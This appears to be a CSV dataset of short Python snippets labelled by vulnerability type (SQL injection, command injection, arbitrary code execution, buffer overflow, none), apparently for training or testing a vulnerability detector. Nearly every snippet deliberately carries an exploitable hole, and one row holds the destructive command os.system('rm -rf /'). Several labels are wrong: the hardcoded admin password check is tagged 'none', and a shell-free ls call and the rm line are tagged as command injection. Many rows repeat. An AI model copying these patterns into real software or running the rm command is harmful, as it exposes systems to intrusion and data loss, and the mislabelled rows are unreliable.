snippet,vulnerability
"user_input = input('Enter your name: ')
query = f""SELECT * FROM users WHERE name = '{user_input}'""
cursor.execute(query)",['sqli']
"import os
command = input('Enter command: ')
os.system(command)",['command_injection']
"import pickle
user_data = input('Enter your data: ')
pickle.loads(user_data)",['arbitrary_code_exec']
"from ctypes import create_string_buffer
buffer = create_string_buffer(10)
input_data = input('Enter data: ')
buffer.raw = input_data.encode()",['buffer_overflow']
"def greet(name):
    print(f""Hello, {name}!"")
greet('Alice')",['none']
"import subprocess
user_input = input('Enter filename: ')
subprocess.call(['ls', user_input])",['command_injection']
eval(input('Enter expression: ')),['arbitrary_code_exec']
"username = input('Username: ')
password = input('Password: ')
if username == 'admin' and password == 'secret':
    print('Access granted')",['none']
exec(input('Code to run: ')),['arbitrary_code_exec']
"from flask import request
@app.route('/search')
def search():
    query = request.args.get('q')
    cursor.execute(f""SELECT * FROM data WHERE item = '{query}'"")",['sqli']
"import os
os.system('rm -rf /')",['command_injection']
"import subprocess
subprocess.call(input('Command to execute: '), shell=True)","['arbitrary_code_exec', 'command_injection']"
"import pickle
pickle.loads(input('Serialized data: '))
name = input('Enter your name: ')
print(f'Hi, {name}')",['arbitrary_code_exec']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"import os
os.system(input('Command: '))",['command_injection']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"import os
os.system(input('Command: '))",['command_injection']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"import os
os.system(input('Command: '))
def add(a, b):
    return a + b
print(add(2, 3))",['command_injection']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
eval(input('Expression: ')),['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))
print('Hello, world!')",['command_injection']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"import pickle
pickle.loads(input('Serialized data: '))
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['arbitrary_code_exec', 'command_injection']"
"name = input('Enter your name: ')
print(f'Hi, {name}')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import pickle
pickle.loads(input('Serialized data: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['arbitrary_code_exec', 'sqli']"
"eval(input('Expression: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['arbitrary_code_exec', 'sqli']"
"eval(input('Expression: '))
print('Hello, world!')",['arbitrary_code_exec']
"import os
os.system(input('Command: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
